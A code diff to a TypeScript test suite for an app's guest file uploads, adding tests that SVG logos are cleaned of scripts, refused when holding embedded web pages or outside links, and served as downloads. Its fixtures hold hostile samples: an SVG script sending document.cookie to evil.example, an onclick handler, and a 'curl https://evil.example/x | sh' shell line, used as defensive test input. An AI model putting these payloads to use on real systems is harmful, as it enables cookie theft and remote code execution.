@@ -15,6 +15,8 @@
  * recovery pass. Only the column a file was taken for takes it, and only in
  * its day. One address past its day of bytes, and a full pool, are refused;
  * a full forms pool never stops a column. A 100 MB file streams to disk.
+ * A customer's SVG logo is kept only as the cleaner writes it, refused when it
+ * is more than a drawing, and handed back as a download.
  */
 import { mkdtemp, rm } from 'node:fs/promises';
 import { tmpdir } from 'node:os';
@@ -25,6 +27,7 @@ import { validateManifest } from '@adminium/manifest';
 import { filesRepo, publicUploadsRepo, rolesRepo, settingsRepo, usersRepo } from '@adminium/meta';
 import { afterAll, beforeAll, describe, expect, it } from 'vitest';
 
+import { cleanSvg } from '../src/files/svg.js';
 import { solveProof } from '../src/public-api/proof.js';
 import { createPublicViews } from '../src/public-api/runtime.js';
 import { createColumnUploads, HOLD_RECOVER_MS } from '../src/public-uploads/columns.js';
@@ -44,6 +47,14 @@ const id = { ref: 'id', type: 'int', role: 'pk' };
 const pdf = (size: number) => Buffer.concat([Buffer.from('%PDF-1.7\n', 'latin1'), Buffer.alloc(Math.max(0, size - 9), 0x20)]);
 const TIFF = Buffer.concat([Buffer.from([0x49, 0x49, 0x2a, 0x00]), Buffer.alloc(120, 3)]);
 const SCRIPT = Buffer.from('#!/bin/sh\ncurl https://evil.example/x | sh\n', 'latin1');
+/** A customer's logo as an editor saves it: a declaration, a class, a script; cleaned, the drawing alone. */
+const LOGO_SVG = Buffer.from(
+  '<?xml version="1.0" encoding="UTF-8"?>\n<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10" class="logo">\n  <script>fetch("https://evil.example/" + document.cookie)</script>\n  <rect width="10" height="10" fill="#c00" onclick="alert(1)"/>\n</svg>\n',
+  'utf8',
+);
+/** A logo that is more than a drawing: a web page inside it, and a link out. */
+const PAGE_SVG = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><foreignObject width="10" height="10"><p xmlns="http://www.w3.org/1999/xhtml">hi</p></foreignObject></svg>', 'utf8');
+const LINK_SVG = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><use xlink:href="https://evil.example/sprite.svg#a"/></svg>', 'utf8');
 
 const fileColumn = (ref: string, accept: string[], kinds: string[], maxBytes: number) => ({
   ref,
@@ -56,7 +67,7 @@ const fileColumn = (ref: string, accept: string[], kinds: string[], maxBytes: nu
 function printShop(): Doc {
   return {
     ...invoicingManifest([
-      { ref: 'clients', columns: [id, { ref: 'email', type: 'text', maxLength: 254, unique: true }, { ref: 'name', type: 'text', maxLength: 120 }, fileColumn('logo', ['png', 'jpeg', 'pdf'], ['png', 'jpg', 'pdf'], 10 * MB)] },
+      { ref: 'clients', columns: [id, { ref: 'email', type: 'text', maxLength: 254, unique: true }, { ref: 'name', type: 'text', maxLength: 120 }, fileColumn('logo', ['png', 'jpeg', 'pdf', 'svg'], ['png', 'jpg', 'pdf', 'svg'], 10 * MB)] },
       {
         ref: 'orders',
         columns: [id, { ref: 'client_id', type: 'fk', references: 'clients' }, { ref: 'note', type: 'text', maxLength: 200, nullable: true }, fileColumn('brief', ['pdf', 'tiff'], ['pdf', 'tiff'], 100 * MB)],
@@ -341,6 +352,45 @@ describe.each(LEGS)("a guest's file into an app's file column — %s", (dialect,
       await settings.set('publicUploads.quotaBytes', 2_147_483_648, { updatedBy: null });
       await settings.set('publicUploads.perAddressDailyBytes', 524_288_000, { updatedBy: null });
     }
+  });
+
+  it.skipIf(!available)("refuses a guest's SVG that holds a web page or a link out, saying to save a plain SVG, and keeps nothing", async () => {
+    const before = await h.meta.db.selectFrom('adminium_files').select('id').where('mime', '=', 'image/svg+xml').execute();
+    for (const [body, said] of [
+      [PAGE_SVG, /foreignObject/],
+      [LINK_SVG, /outside the drawing/],
+    ] as const) {
+      const res = await send(ref.clients(), 'logo', body, { session: ada, name: 'logo.svg', type: 'image/svg+xml' });
+      expect(res.statusCode, res.body).toBe(415);
+      const refused = (res.json() as { error: { code: string; message: string; params?: Doc } }).error;
+      expect(refused).toMatchObject({ code: 'PUBLIC_UPLOAD_REFUSED', params: { reason: 'kind' } });
+      expect(refused.message).toMatch(said);
+      expect(refused.message).toMatch(/Save it as a plain SVG and upload it again\.$/);
+    }
+    // Neither the file nor its cleaned copy was kept.
+    expect(await h.meta.db.selectFrom('adminium_files').select('id').where('mime', '=', 'image/svg+xml').execute()).toEqual(before);
+  });
+
+  it.skipIf(!available)("keeps a guest's SVG logo only as the cleaner writes it, without its script, and hands it back as a download", async () => {
+    const cleaned = cleanSvg(LOGO_SVG);
+    expect(cleaned.toString('utf8')).not.toMatch(/script|onclick|class/);
+    const logo = await uploaded(ref.clients(), 'logo', LOGO_SVG, { session: ada, name: 'logo.svg', type: 'image/svg+xml' });
+    expect((await fileOf(logo)).kind).toBe('svg');
+    const res = await patch(`/records/${ref.clients()}/1`, { values: { logo } }, ada);
+    expect(res.statusCode, res.body).toBe(200);
+    const fileId = String((await rows('clients'))[0]!['logo']);
+    expect(await filesRepo(h.meta).findById(fileId)).toMatchObject({ kind: 'upload', uploadedBy: null, mime: 'image/svg+xml', sizeBytes: cleaned.length });
+    // The guest reads back the cleaned copy, never drawn on their page.
+    const own = await served.get(`/files/${ref.clients()}/1/logo`, ada);
+    expect(own.statusCode, own.body).toBe(200);
+    expect(own.rawPayload.equals(cleaned)).toBe(true);
+    expect(own.headers['content-type']).toBe('image/svg+xml');
+    expect(own.headers['content-disposition']).toMatch(/^attachment/);
+    expect(own.headers['x-content-type-options']).toBe('nosniff');
+    // Staff open the same bytes.
+    const staff = await served.composed.app.inject({ method: 'GET', url: `/api/v1/files/${fileId}/content`, headers: { cookie } });
+    expect(staff.statusCode, staff.body).toBe(200);
+    expect(staff.rawPayload.equals(cleaned)).toBe(true);
   });
 
   it.skipIf(!available)('streams a 100 MB brief to disk without holding the body in memory', async () => {
